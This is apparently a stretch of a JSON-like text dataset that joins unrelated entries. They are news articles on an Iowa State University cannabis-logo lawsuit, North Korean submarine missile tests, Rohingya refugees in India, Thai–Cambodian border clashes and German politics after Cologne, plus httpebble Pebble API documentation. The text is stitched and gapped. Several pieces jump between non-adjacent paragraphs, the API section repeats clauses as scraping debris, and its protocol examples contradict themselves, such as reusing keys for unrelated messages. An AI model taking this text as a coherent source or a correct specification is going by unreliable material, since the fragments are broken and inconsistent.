T-shirt designs featuring the ISU initials and a cannabis leaf have been twice rejected, according to the lawsuit. Other shirt designs without a marijuana leaf have been approved by the school on two occasions.\n\nNEWSLETTERS Get the Breaking News Alert newsletter delivered to your inbox We're sorry, but something went wrong Alerts on breaking news delivered straight to your inbox.

The university believes it can legally make determinations about who is allowed to use its trademarks, he said.\n\n\"Student organizations at Iowa State University have the right to express their views, but they can't attribute those views to the university,\" he said. \"Iowa State has the right and obligation to manage the use of our university trademarks.\"\n\nHowever, the case appears to be a classic example of a government entity discriminating against a group because of political speech, said Robert Shibley, a senior vice president with FIRE. It wouldn't be constitutionally right if the university allows some student groups to use the logo but not others, he said.\n\n\"Are they making viewpoint-based determinations and discriminating against one viewpoint?\" he said.\n\n\"Here it seems likely they did do that and they actually set forth a policy that allowed them to do that.\"\n\nIt's important to note that ISU NORML's message is not about using marijuana illegally, but changing laws nationwide that currently prohibit the drug, he said. It's an important public policy topic at a time when two states have legalized cannabis for recreational use and others, including Iowa, have legalized it for limited medical use, the lawsuit said.\n\nSince the university revised its policy surrounding the trademarks in 2013, the trademark and licensing office has rejected 289 requests to use the university's trademarks, according to data provided by the university. That number includes 163 rejections in 2013 and 126 so far in 2014.\n\nThe lawsuit names Leath; Warren Madden, the senior vice president of business and financial affairs; Thomas Hill, the senior vice president for student affairs; and Leesha Zimmerman, the program director of the trademark and licensing office, as defendants.\n\nOther court filings\n\nThe Philadelphia-based Foundation for Individual Rights in Education, or FIRE, coordinated four court filings on Tuesday including the one in Iowa against Iowa State University.\n\nThe lawsuits are part of a national effort to eliminate what FIRE believes is unconstitutional speech codes.\n\nThe other lawsuits were against Ohio University, Chicago State University and Citrus College (Calif.).\n\nRead or Share this story: http://dmreg.co/1lRnaou",

Valid values for width are: 'b' – signed eight-bit integer 'B' – unsigned eight-bit integer 's' – signed 16-bit integer 'S' – unsigned 16-bit integer 'i' – signed 32-bit integer 'I' – unsigned 32-bit integer\n\nBinary data may be specified as a tuple like so: [ d , base64-encoded-data]\n\nHere is a sample valid response message:\n\n{\"1\": ['b', 7], \"2\": ['s', 18], \"3\": \"Some string\", \"4\": 17}\n\nPebble API: General\n\nThis section describes methods relevant to all parts of httpebble.\n\nMethods\n\nhttp_set_app_id(int32_t app_id)\n\nvoid http_set_app_id(int32_t id);\n\nIt is strongly recommended that you call this method with some (really) random integer somewhere in the 32-bit signed integer range. Setting it uniquely ensures that your app will not receive misdirected responses or mix its dict storage keys with another app.\n\nhttp_register_callbacks\n\nbool http_register_callbacks(HTTPCallbacks callbacks, void* context);\n\nRegisters the HTTP callbacks with the AppMessages system, and registers the provided HTTPCallbacks with the HTTP system.

You should understand that the data storage is best-effort, and may be wiped without warning (e.g. because the user) deleted the phone app or similar. For critical information, consider using the HTTP API and X-Pebble-ID header to store the data remotely. All local cookie functions take a leading request_id argument that will be returned to the application in any callbacks; it can take any integer value.\n\nMethods\n\nhttp_cookie_set_int\n\nHTTPResult http_cookie_set_int(uint32_t request_id, uint32_t key, const void* integer, uint8_t width_bytes, bool is_signed);\n\nThis method sets the given key to an integer of width 1 , 2 or 4 bytes, signed or not as appropriate\n\nrequest_id is an application-defined request ID\n\nis an application-defined request ID key is the key to set a value on\n\nis the key to set a value on integer is a pointer to the value to set\n\nis a pointer to the value to set width_bytes is the number of bytes in the integer: 1 for an int8 or uint8 2 for an int16 or uint16 4 for an int32 or uint32 No other value is acceptable\n\nis the number of bytes in the integer: is_signed indicates whether the value is signed or not.\n\nhttp_cookie_set_int…\n\nHTTPResult http_cookie_set_int32(uint32_t request_id, uint32_t key, int32_t value);\n\nHTTPResult http_cookie_set_uint32(uint32_t request_id, uint32_t key, uint32_t value);\n\nHTTPResult http_cookie_set_int16(uint32_t request_id, uint32_t key, int16_t value);\n\nHTTPResult http_cookie_set_uint16(uint32_t request_id, uint32_t key, uint16_t value);\n\nHTTPResult http_cookie_set_int8(uint32_t request_id, uint32_t key, int8_t value);\n\nHTTPResult http_cookie_set_uint8(uint32_t request_id, uint32_t key, uint8_t value);\n\nThese are helper methods for the above http_cookie_set .\n\nrequest_id is an application-defined request ID\n\nis an application-defined request ID key is the key to set\n\nis the key to set value is the value to set.\n\nhttp_cookie_set_cstring\n\nHTTPResult http_cookie_set_cstring(uint32_t request_id, uint32_t key, const char* value);\n\nSets the key key to be the C string value .\n\nhttp_cookie_set_data\n\nHTTPResult http_cookie_set_data(uint32_t request_id, uint32_t key, const uint8_t* const value, int length);\n\nSets the key key to hold length bytes of the arbitrary buffer value .\n\nhttp_cookie_get\n\nHTTPResult http_cookie_get(uint32_t request_id, uint32_t key);\n\nRequests that the given key be retrieved.

It is generally unnecessary to call it, and the current iOS implementation syncs after each write or delete command anyway.\n\nCallbacks\n\nThere are lots of them, some of which are redundant to each other, depending on your needs.\n\nHTTPPhoneCookieBatchGetHandler\n\ntypedef void(*HTTPPhoneCookieBatchGetHandler)(int32_t request_id, DictionaryIterator* result, void* context);\n\nCalled when a request for values (either one or many) completes.

The accuracy of these functions depends on the accuracy of the user’s phone’s clock.\n\nFunctions\n\nhttp_time_request\n\nHTTPResult http_time_request();\n\nRequests the user’s timezone information from the phone.\n\nCallbacks\n\nhttp_time_handler\n\ntypedef void(*HTTPTimeHandler)(int32_t utc_offset_seconds, bool is_dst, uint32_t unixtime, const char* tz_name);\n\nCalled when timezone information is available.\n\nutc_offset_seconds is the user’s offset from UTC in seconds (may not be a multiple of 3600; may be negative)\n\nis the user’s offset from UTC in seconds (may not be a multiple of 3600; may be negative) is_dst indicates whether it is currently Daylight Saving Time in the user’s timezone\n\nindicates whether it is currently Daylight Saving Time in the user’s timezone unixtime gives the current unix timestamp (seconds since 1st January 1970, UTX)\n\ngives the current unix timestamp (seconds since 1st January 1970, UTX) tz_name gives the name of the user’s timezone (e.g. \"America/New_York\" ). This value is allocated on the stack and must be copied for use outside the callback. This value may not be available, or may only give UTC offset, depending on the user’s time settings.\n\nNote that the unixtime is accurate as of the phone receiving and processing the message; not as of the time this callback occurs. That said, there is usually no discernable latency between the two events.\n\nPebble API: Location\n\nThe location API enables your application to determine a once-off reasonably accurate location for the user. The resulting values should be accurate to within about a kilometre.\n\nFunctions\n\nhttp_location_request\n\nHTTPResult http_location_request();\n\nRequests the user’s approximate location from the phone, as determined via GPS or other means at the phone’s discretion.\n\nCallbacks\n\nHTTPLocationHandler\n\ntypedef void(*HTTPLocationHandler)(float latitude, float longitude, float altitude, float accuracy, void* context);\n\nCalled when the user’s location is available.\n\nlatitude contains the user’s latitude.\n\ncontains the user’s latitude. longitude contains the user’s longitude.\n\ncontains the user’s longitude. altitude contains the user’s altitude in metres.\n\ncontains the user’s altitude in metres. accuracy contains the uncertainty of the two-dimensional location given in metres.\n\nIn general, altitude will probably be less accurate than latitude and longitude .\n\nBridge Interface\n\nThis section describes the pebble/bridge communication protocol, and is probably not of interest to application developers. It is, however, of interest to anyone who has reason to implement their own bridge.\n\nNB: If implementing your own bridge, please use the UUID 9141B628-BC89-498E-B147-049F49C099AD if your bridge is compliant with this specification. This allows all applications to use your bridge, rather than breaking them or failing to provide a useful implementation.\n\nSince there is no way for the watch app to initialiate a session, a session should be opened on bridge launch and not closed until bridge exit.\n\nReserved dictionary keys\n\nAll keys between 0xF000 and 0xFFFF are reserved for use from user applications. Additionally, all keys between 0xFF00 and 0xFFFF are reserved specifically to httpebble .\n\nThe following named dictionary keys are used by the protocol:\n\n0xFFFF – HTTP_URL_KEY : a URL to request\n\n0xFFFE – HTTP_STATUS_KEY : HTTP status code\n\n0xFFFC – HTTP_COOKIE_KEY : user-defined cookie\n\n0xFFFB – HTTP_CONNECT_KEY : sent when a the app connects to the watch\n\nHTTP_URL_KEY ( 0xFFFF ): a URL to request\n\nHTTP_STATUS_KEY ( 0xFFFE ): the HTTP status code\n\nHTTP_REQUEST_ID_KEY ( 0xFFFC ): the request ID specified by the user to return (HTTP requests only)\n\nHTTP_CONNECT_KEY ( 0xFFFB ): indicates that the watch has (re)connected to the phone app\n\nHTTP_APP_ID_KEY ( 0xFFF2 ): specifies the application’s app ID\n\nHTTP_COOKIE_STORE_KEY ( 0xFFF0 ): Request storing key-value data\n\nHTTP_COOKIE_LOAD_KEY ( 0xFFF1 ): Request loading key-value data\n\nHTTP_COOKIE_FSYNC_KEY ( 0xFFF3 ): Request syncing key-value data\n\nHTTP_COOKIE_DELETE_KEY ( 0xFFF4 ): Request deleting key-value data\n\nHTTP_TIME_KEY ( 0xFFF5 ): Request timezone information\n\nHTTP_UTC_OFFSET_KEY ( 0xFFF6 ): User’s UTC offset\n\nHTTP_IS_DST_KEY ( 0xFFF7 ): Whether DST is in effect\n\nHTTP_TZ_NAME_KEY ( 0xFFF8 ): User’s timezone name\n\nHTTP_LOCATION_KEY ( 0xFFE0 ): Request location information\n\nHTTP_LATITUDE_KEY ( 0xFFE1 ): User’s latitude\n\nHTTP_LONGITUDE_KEY ( 0xFFE2 ): User’s longitude\n\nHTTP_ALTITUDE_KEY ( 0xFFE3 ): User’s altitude\n\nHenceforth they will be referred to by name.\n\nHTTP requests\n\nPebble to Phone\n\nTo make a request the Pebble uses AppMessages to send a dictionary to the bridge app.\n\nThe dictionary must contain the following keys at minimum:\n\nHTTP_URL_KEY: (char*)\"http://example.com/foo\" // Any URL of the user's choosing. Both HTTP and HTTPS should be supported. HTTP_COOKIE_KEY: (int32_t)42 // An arbitrary 32-bit signed integer provided by the user, to be sent with the response. HTTP_APP_ID_KEY: (int32_t)84 // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nAny additional keys included must be included in the JSON dictionary to be sent to the server, as specified in the Server Interface section. The cookie should be stored to be returned in the associated response. It must not be returned with any other response. The same applies to the app ID.\n\nPhone to Pebble\n\nUpon receiving a response (or failing to receive a response), the bridge must communicate this back to the pebble. This is again achieved by sending an AppMessage. The following keys are used:\n\nHTTP_STATUS_KEY: (uint16_t)200 // An signed 16-bit integer containing the returned HTTP status code. HTTP_URL_KEY: (uint8_t)1 // An unsigned 8-bit boolean (true/false) indicating whether the request was successful. HTTP_COOKIE_KEY: (int32_t)42 // An arbitrary 32-bit signed integer provided by the user in the request HTTP_APP_ID_KEY: (int32_t)84 // An arbitrary 32-bit signed integer that uniquely identifies an individual application.\n\nIn addition, any values provided by the server should be appended to the dictionary, as specified in the Server Interface section.\n\nThe current bridge implementation also gives HTTP_STATUS_KEY as 500 and HTTP_STATUS_KEY as 0 in the event of an invalid “successful” response from the server.\n\nIndicating connection\n\nWhen the phone app discovers the watch, it must send a message to it to activate the connection. That message is as follows:\n\nHTTP_CONNECT_KEY: (uint8_t)1\n\nThis triggers a callback on the watch and also ensures the connection is active. This message is phone to pebble only.\n\nTimezone information\n\nPebble to Phone\n\nTo request timezone information, the Pebble sends the following dictionary via AppMessages:\n\nHTTP_TIME_KEY: (uint8_t)1\n\nIn response, the phone should send time information as below:\n\nPhone to Pebble\n\nThe response is a dictionary containing the user’s current offset from GMT, DST state, a unix timestamp, and the timezone name, a follows:\n\nHTTP_TIME_KEY: (uint32_t)136878176 // The current unix time (unsigned) HTTP_UTC_OFFSET_KEY: (uint32_t)-14400 // User's offset from UTC in seconds HTTP_IS_DST_KEY: (uint8_t)1 // Whether DST is active for the user HTTP_TZ_NAME_KEY: (char*)\"America/New_York\" // The name of the user's timezone, if possible.\n\nThe timezone name should ideally be in the standard tzinfo format, but this isn’t a hard requirement, and a string containing the UTC offset would also be acceptable.\n\nLocation information\n\nPebble to Phone\n\nThe Pebble sends the following dictionary via AppMessages to request the user’s location:\n\nHTTP_LOCATION_KEY: (uint8_t)1\n\nIn response, the phone sends location information as below:\n\nPhone to Pebble\n\nThis response calls for sending floats, which AppMessage does not permit. Instead, the float should be converted to its binary form, then that binary form reinterpreted as a uint32. Then the resultant uint32 should be sent to the pebble, which will perform the inverse conversion.\n\nHTTP_LOCATION_KEY: (float)accuracy HTTP_LATITUDE_KEY: (float)latitude HTTP_LONGITUDE_KEY: (float)longitude HTTP_ALTITUDE_KEY: (float)altitude\n\nThe location given should be reasonably accurate, but within a kilometre or so is acceptable.\n\nSetting entries in the key-value store\n\nPebble to Phone\n\nThe pebble sends a dictionary containing at least the following keys:\n\nHTTP_COOKIE_STORE_KEY:(int32_t)requestId // An arbitrary 32-bit signed integer provided by the user in the request HTTP_APP_ID_KEY: (int32_t)app_id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nIn addition, the dictionary may include an arbitrary number of additional key/value pairs. Each such pair should be inserted into persistent storage, maintaining the original type of the value (including the integer width and signedness, if appropriate).\n\nPhone to Pebble\n\nThe phone responds with the following dictionary to indicate success:\n\nHTTP_COOKIE_STORE_KEY:(int32_t)requestId // An arbitrary 32-bit signed integer provided by the user in the request HTTP_APP_ID_KEY: (int32_t)app_Id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nThis is the same as the received dictionary, but without any user-defined keys.\n\nRetrieving entries from the key-value store\n\nPebble to Phone\n\nThe pebble sends a dictionary containing at least the following keys:\n\nHTTP_COOKIE_LOAD_KEY:(int32_t)requestId // An arbitrary 32-bit signed integer provided by the user in the request HTTP_APP_ID_KEY: (int32_t)app_Id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nIn addition, the dictionary may include an arbitrary number of keys with the uint8 value 1 . The values of these keys should be ignored; the keys are those that the user is requesting be retrieved.\n\nPhone to Pebble\n\nThe phone should respond with a dictionary containing at least the following:\n\nHTTP_COOKIE_LOAD_KEY:(int32_t)requestId // An arbitrary 32-bit signed integer provided by the user in the request HTTP_APP_ID_KEY: (int32_t)app_Id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nAdditionally, for each key requested by the user that was found in the store, that key and its associated value (with original type) should be inserted into the dictionary. If a requested key could not be found in the dictionary, it should be silently dropped.\n\nDeleting entries from the key-value store\n\nPebble to Phone\n\nThe pebble sends a dictionary containing at least the following keys:\n\nHTTP_COOKIE_DELETE_KEY:(int32_t)requestId // An arbitrary 32-bit signed integer provided by the user in the request HTTP_APP_ID_KEY: (int32_t)app_Id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nIn addition, the dictionary may include an arbitrary number of keys with the uint8 value 1 . The values of these keys should be ignored; the keys are those that the user is requesting be deleted.\n\nPhone to Pebble\n\nThe phone responds with the following dictionary to indicate success:\n\nHTTP_COOKIE_DELETE_KEY:(int32_t)requestId // An arbitrary 32-bit signed integer provided by the user in the request HTTP_APP_ID_KEY: (int32_t)app_Id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nThis is the same as the received dictionary, but without any user-defined keys.\n\nFsync\n\nThis call is a request to ensure that the persistent data store is actually written out to disk. It should not be necessary.\n\nPebble to Phone\n\nHTTP_COOKIE_LOAD_KEY:(uint8_t)1 // true. HTTP_APP_ID_KEY: (int32_t)app_Id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nPhone to Pebbble\n\nHTTP_COOKIE_LOAD_KEY:(uint8_t)success // true. HTTP_APP_ID_KEY: (int32_t)app_Id // An arbitrary 32-bit signed integer that uniquely identifies an individual application\n\nSuccess should be true if the sync was successful, false otherwise. This whole is probably optional, but if not implemented should always claim to have succeeded.",
  "latent_18965": "North Korea may be accelerating the development of the sea-based leg of its nuclear forces\n\nRecent satellite photos suggest North Korea could be preparing for fresh submarine-based ballistic missile tests, an expert on its military said Friday.Joseph Bermudez, a specialist in North Korean defense and intelligence affairs, posted photographs on the authoritative 38 North blog of the US-Korea Institute at Johns Hopkins University which he said could show preparations for a test of a submarine-launched ballistic missile (SLBM).\"Recent commercial satellite imagery reveals several developments suggesting that North Korea may be accelerating the development of the sea-based leg of its nuclear forces,\" he said.Activity on a SINPO-class experimental ballistic missile submarine at the Mayang-do navy shipyard and submarine base, he said, suggests \"that the North may be preparing for a new series of 'at sea' test launches, has undertaken modifications or upgrades to the submarine's launch systems, or is developing a more advanced version of the Pukguksong-1.\"The Pukguksong-1 is an SLBM that was first successfully test-launched on August 24, 2016.That missile flew 500 kilometers (300 miles) towards Japan, which leader Kim Jong-Un said at the time put the US mainland within striking range from a Pacific-based submarine.Bermudez said the preparations at the submarine in recent weeks match those ahead of previous tests.The preparations come amid a tense escalation of threats between the United States and North Korea over the latter's recent gains in nuclear weapons technology and its successful launch of an intercontinental ballistic missile that theoretically could hit cities on the US east coast.A proven SLBM system would take North Korea's nuclear strike threat to a new level, allowing deployment far beyond the Korean peninsula and a \"second-strike\" capability in the event of an attack on its military bases.",

The meeting last evening was called by Nripendra Misra, the top aide to Prime Minister Narendra Modi; the attendees included National Security Advisor Ajit Doval and the heads of intelligence agencies including the Research and Analysis Wing (R&AW). They focused on increasing alerts about links between Rohingya militant commanders in Myanmar and terror groups in Pakistan including Hafiz Saeed's Lashkar-e-Taiba. An intel report reviewed by them concludes \"In our assessment, penetration of Pakistan-based terrorist outfits among Rohingya Muslims community is a serious emerging threat, as the same would ultimately be used for targeting India.\"The meeting was called after India was named and shamed for its stand on the Rohingyas at the United Nations top human rights body on Monday by the chief of the agency. India's representative offered an arduous rebuttal , but the timing of yesterday's brain-storming session and the seniority of those who were present illustrates that the reprimand is a sore point.India says it currently has about 40,000 Rohingyas who have escaped in recent years from the rising violence against them in Myanmar and entered India through the north-east border. Most of them are settled in Jammu, Hyderabad and in and around Delhi. But officials say there has been no great spike in arrival in India's in the last few weeks. At least 1,25,000 Rohingyas have fled Myanmar's western state of Rakhine after the military cracked down on Rohingya insurgents who attacked an army base and dozens of police posts.The intelligence note reviewed last evening highlights that Rohingya insurgents in Myanmar have established links to Hafiz Saeed and his Lashkar-e-Taiba, which is based in Pakistan and is responsible for the 26/11 siege on Mumbai among other deadly terror attacks in India.The Lashkar funds and arms Rohingya militants, Indian intelligence agencies believe. The note attaches photographs that show Hafiz Saeed addressing a Rohingya militant outfit in Karachi in July 2012. The chief of HuJi, a major terror network in Pakistan and Bangladesh, is a Pakistani national of Rohingya origin. Top Pakistani terror group commanders visited a conference organized in 2012 in Bangladesh by Rohingya militants.There are other red flags for India: a Pakistani Al Qaeda operative called Maulana Ustad Wazeer visited Thailand last month to train Rohingya militants. Intelligence officials are also trying to determine if a Rohingya in Kashmir was the guide for terrorists who crossed the border last month for a major attack on a police compound in Pulwama in which eight security personnel were killed 25 km from Srinagar. Junior Home Minister Kiren Rijiju today tweeted \"This chorus of branding India as villain on Rohingya issue is a calibrated design to tarnish India's image . It undermines India's security.\" The remark appeared to be a response to the UN's upbraiding earlier this week. And while Mr Rijiju maintains that the Rohingyas will be deported , officials who were at last evening's meeting say that's impractical - for one, they are now a people without a country. \"Where will you deport them? Myanmar refuses to accept them,\" said one official who attended last night's meeting, asking not to be named because of the sensitivity of the discussions. Another challenge identified was the difficulty in distinguishing between illegal immigrants from Bangladesh who regularly stream across the porous border and Rohingyas. \"Even the language is similiar and so many women are coming, so our border officials cannot be too intrusive,\" an official told NDTV. The Border Security Force is trying to confine them and persuade them to return. With little impact. \"The focus is now on increased border patrolling, however, that's not easy due to the sheer size (of the border region),\" said officials.",
  "latent_19234": "BANGKOK (Reuters) - A bloody conflict between Thai and Cambodian forces has added another twist to Thailand’s political crisis, and not without benefit to Cambodian strongman, Hun Sen.\n\nCambodia's Prime Minister Hun Sen gestures as he visits the ASEAN Tourism Forum exhibition at Koh Pich island in Phnom Penh January 20, 2011. REUTERS/Samrang Pring\n\nRegardless of which side fired first, the border battles have handed Prime Minister Hun Sen and his ruling Cambodian People’s Party (CPP) a chance to score points at home by taking a stand against an eternal rival he accuses of flexing its superior military muscle.\n\nOn the surface, the latest flare-up is a fight over a stretch of border close to Tan Moan and Tan Krabey, two 12th century Hindu temples both sides lay claim to. So far, 18 people on both sides have been killed in 12 days of gunfights, grenades and artillery bombardments that have displaced 65,000 people.\n\nAnalysts say political factions on both sides of the frontier have something to gain from prolonging the fight and scuttling a fragile ceasefire agreed between the two armies.\n\nThe clashes have struck a chord with Cambodians and Hun Sen’s efforts to internationalize the issue by calling for help from the United Nations, the Association of South East Asian Nations (ASEAN) and the International Court of Justice have helped stoke nationalist fervour.\n\n“This conflict is being played to the full extent by Hun Sen and with this tough stance he will seek to gain as much status as he can from this,” said Ian Bryson, a Southeast Asia analyst at consultants Control Risks.\n\n“The CPP government recognizes that the sovereignty issue is a vehicle for popularity that has almost become policy and gives it a mandate for its rule.”\n\nConspiracy theorists suggest hawkish Thai generals in cahoots with conservative nationalists could be fuelling the conflict to delay an election expected by early July, or even to create a pretext for a coup, to prevent the opposition Puea Thai Party from forming the next government.\n\nThai officials reject that claim. Some privately point the finger at Hun Sen, suggesting it’s in his interest to discredit Thai Prime Minister Abhisit Vejjajiva ahead of the election.\n\nHun Sen, 60, has made no secret of his annoyance at Thailand’s heel-dragging on demarcating disputed stretches of their shared 800-km (500-mile) land border and 27,000 square km (10,400 sq miles) of maritime territory believed to contain offshore oil reserves. A joint border commission has carried out studies since 2000 but no agreement has been reached.\n\nNeither has the former Khmer Rouge guerrilla sought to hide his loathing for Abhisit’s Democrat Party-led government, which last week he called “thieves” and “terrorists.”\n\nTEMPLE TURMOIL\n\nUnder Abhisit, Thailand has sought to derail Cambodia’s listing of a far more significant Hindu border temple, Preah Vihear, as a UNESCO World Heritage site. A 1962 World Court ruling awarded the temple to Cambodia but Thailand says the land around the ruins was never demarcated.\n\nClashes in that area from February 4-7 killed three Thai and eight Cambodian troops. There was also some fighting near this temple in the latest flare-up.\n\nHun Sen said last week he was willing to work with Thailand’s “next government,” interpreted as a show of support for Puea Thai, allied to his exiled friend and former Thai prime minister Thaksin Shinawatra.\n\nBut most analysts play down any Cambodian motivation to meddle in Thailand’s internal crisis, despite Hun Sen’s thumbing his nose at Abhisit by briefly hiring Thaksin as an economic adviser in 2009 and refusing to extradite him to serve a prison term for graft.\n\nThaksin also has much to lose by being seen as close to Hun Sen at this time, if nationalist sentiment rises in Thailand.\n\nThai generals point out that the fighting coincides with the promotion of Hun Sen’s eldest son, Hun Manet, to a two-star general and deputy commander of the country’s infantry in what many Cambodians see as a tentative step toward a political dynasty in a country run by the same man for 26 years.\n\nWith a doctorate in economics from Britain’s Bristol University and having graduated from West Point military academy in the United States, many analysts suggest 33-year-old Hun Manet is being groomed as a successor and say the Thai conflict gives him a chance to assert himself within Cambodia’s military.\n\nOthers say the clashes are helping to draw attention away from rising discontent in Cambodia over forced evictions to make way for development projects, labor and trade union disputes and tough laws virtually outlawing protests.\n\n“The dispute, by fanning nationalist flames in Cambodia as well, distracts from other pressing problems,” said Joshua Kurlantzick of the U.S-based Council on Foreign Relations think tank. “With Cambodia’s domestic troubles unlikely to disappear, Preah Vihear probably will not either,” he said in a blog post.\n\nThe issue is expected to be a hot topic at an ASEAN summit in Jakarta this weekend. Cambodia has rejected bilateral talks and is insisting on third-party mediation, a move that has riled Thailand and suggests to some analysts that Hun Sen’s government is in no rush to find a solution.\n\n“Cambodia’s motivations are probably much simpler,” Eurasia Group analyst Roberto Herrera-Lim said in a research note.\n\n“Hun Sen scores political points domestically by standing up to what he would like Cambodians to see as a bullying Thailand, as long as the military losses are small and the outcome is inconclusive.”",
  "latent_19376": "Elections will be held in the German states of Baden-Württemberg, Rhineland-Palatinate and Saxony-Anhalt on 13 March, with some commentators viewing the elections as an effective vote of confidence on Angela Merkel’s policy on refugees. Nitzan Shoshan assesses the political response to the incidents which took place in Cologne and other German cities on New Year’s eve. He states that while some of the issues raised by political actors, such as reforming Germany’s laws on sexual assault, are undoubtedly justified, there is a danger of mainstream parties inadvertently legitimising the narratives of the German far-right.\n\nAs recently as early summer 2015, in the heat of the Greek debt crisis, Germanys Chancellor Angela Merkel and Minister of Finance Wolfgang Schäuble faced comparisons with the Nazis and accusations of wrecking the EU, with the country being condemned for ‘historical amnesia’ and ‘hypocrisy’. By the summer’s end, as the dimensions of the so-called refugee crisis had become evident, the world was applauding a Germany that, unlike numerous other European countries, had learned from its history, showing solidarity in the face of immense suffering, while Merkel was praised for her commitment to a Europe of open borders.\n\nSome have interpreted Germany’s response as reflecting a deep sense of historical responsibility, others as a cynical maneuver for rehabilitating Merkel’s blemished image. Another explanation, however, paints Berlin’s seemingly erratic course as in fact rather coherent, consistently motivated by economic pragmatism rather than altruistic humanism or public relations ploys.\n\nIn both the Greek and the refugee crises Merkel enjoyed the support of dominant economic sectors and business interests. Any limits on movement within the Schengen countries threatens to impose huge costs on Germany’s export-based economy, which depends in particular on the European market. Merkel thus has good reasons to resist stricter border controls and advocate a common EU policy. Forced to choose between economic deceleration and the challenges of mass migration, she decidedly favours the latter. Finally, Germany’s broadly-acknowledged demographic deficits and the (at the time) wide domestic popularity of Merkel’s refugee policy doubtlessly also played their part.\n\nGermany’s migration dilemma\n\nMerkel’s description of what transpired in Cologne on New Year’s Eve as a ‘bombshell’ is therefore hardly an overstatement. As is already well known, about 1,000 people, mostly young men, reportedly assembled near the city’s cathedral and central train station. Several groups of 20-40 individuals each surrounded, sexually assaulted, and robbed women leaving the train station or crossing the square.\n\nThe magnitude of the events took time to sink in as complaints piled up. By mid-January Cologne’s police, whose chief officer was sacked within a week of the incident, reported 766 complaints, 381 for sex crimes, and nearly 500 women who alleged to have suffered sexual assaults. According to police, all suspects have a migration background, the vast majority North-African. Numerous other German cities – including Munich, Stuttgart, Frankfurt, Düsseldorf, and Nuremberg – as well as cities in other countries such as Austria, Finland and Sweden, registered similar incidents.\n\nThe Cologne attacks exacerbated already existing tensions between Merkel and her critics within the CDU, where some have recently called for a daily cap on refugee entries and questioned the Chancellor’s open-door policy, potentially shaking her seemingly ironclad leadership. In particular, the CDU’s sister party, the Bavarian CSU, has sharpened its attacks on Merkel, demanding a cap on refugee entries at 200,000 annually, down from over one million in 2015.\n\nMembers of the CDU fear potential losses of electoral support in upcoming state elections to the right-wing, Eurosceptic Alternative for Germany (AfD), a vociferous advocate of strict controls over national borders (a demand in line with the party’s broader agenda against the EU’s encroachment on national sovereignty). Founded in 2013 and scoring early electoral successes, the AfD had until not long ago been considered washed up, but has recently shown significant gains in the polls.\n\nOn the streets, the ‘Pegida’ (Patriotic Europeans against the Islamization of the West) movement, also presumed by many to have imploded into insignificance, has similarly risen from the ashes. Attracting massive media coverage in the winter of 2014-15, Pegida had subsequently witnessed its numbers plummet and had all but vanished from international news. Turnout at its rallies, however, rebounded forcefully during the late fall of 2015 as the refugee crisis showed no sign of abating.\n\nSince New Year, two separate demonstrations in Cologne and in Leipzig have spiraled into violence and riots, including organised attacks on foreigners. While authorities as well as NGOs have registered escalating racist violence for a while, such developments raise acute public worries about a new resurgence of right-wing extremist brutality. Racist crimes more than quadrupled in 2015, compared with the previous year, and those involving violence have shot up six-fold, while arson attacks on refugee shelters have surpassed 200. Recently, the German press has anxiously reported on vigilante groups (Bürgerwehr) patrolling the streets of several cities.\n\nTo many in Germany, such images evoke the racist violence of the early 1990s, when neo-Nazi skinheads terrorised (mostly formerly east) German cities and refugee shelters were torched in Rostock, Solingen, and Hoyerswerda. Then, as now, Germany faced unprecedented numbers of refugee arrivals (though today’s dwarf those of the 1990s). Then, as now, German leaders responded with calls for stricter asylum laws and harsher enforcement.\n\nThe so-called asylum compromise of the 1990s aimed to drastically diminish refugee intake. Today, with the exception only of the left-wing Die Linke party, a consensus has emerged that the Cologne events signal the need for further asylum reforms, particularly to address ‘foreigner criminality’. Likely steps range from reforms to Germany’s sex crime law and less restrictive deportation rules, to changes in asylum laws and increased policing and surveillance, including arbitrary identity checks.\n\nReactive policies and the far-right\n\nGermany may well require a boost to its police force, and the arguments for reforming the country’s obsolete sex crimes legislation – a move already on the table for months prior to the Cologne attacks – are uncontestable. But the pattern of German public figures of almost all shades, who time and again unwittingly endorse the long-held positions of the most unabashedly xenophobic fringes of the far right, nevertheless remains deeply worrying.\n\nConsider the question of sex crimes. In the aftermath of the Cologne attacks, critical voices have expressed scepticism about the supposedly sudden interest in gender violence on the German far right, which is generally viewed as committed to patriarchal values and traditional gender roles. Yet sexual abuse has long featured prominently in far right discourse as an urgent problem criminally neglected by the state.\n\nFar right rhetoric, to be sure, has often associated sexual abuse with the figure of the criminal foreigner, whether explicitly or implicitly. But this has not always been the case. Among the young right-wing extremists with whom I conducted ethnographic fieldwork, for example, several men organised a vigilante group and brutally tortured alleged child molesters based on rumours. None of their victims were foreigners or had an immigration background.\n\nThe issue of deportations offers another example. Irrespective of whether Germany’s existing laws are sufficiently strict, the claim that the German justice system is unfairly lenient on criminal migrants is commonplace for right-wing extremist parties and movements. It was practically a truism for the young people with whom I worked, who attributed this putative leniency to the courts’ hesitation to trigger deportations by disbursing harsher sentences.\n\nIn the 1990s, critics condemned the asylum compromise as official ratification of the claims – if not the acts – of the rioters and arsonists of Solingen and other cities. Today, once more, German leaders inadvertently confirm longstanding allegations of the xenophobic far right. Germany’s sex crimes legislation, which leaves many victims of rape and harassment unprotected, no doubt requires a re-haul, and its deportation policy may or may not be in need of reform. But the timing, and the reasoning, could not be worse.\n\nPlease read our comments policy before commenting.\n\nNote: This article gives the views of the author, and not the position of EUROPP – European Politics and Policy, nor of the London School of Economics.\n\nShortened URL for this post: http://bit.ly/1KRfy3I\n\n_________________________________\n\nAbout the author\n\nNitzan Shoshan – El Colegio de México\n\nNitzan Shoshan is a Professor at the Centro de Estudios Sociológicos in El Colegio de México.",
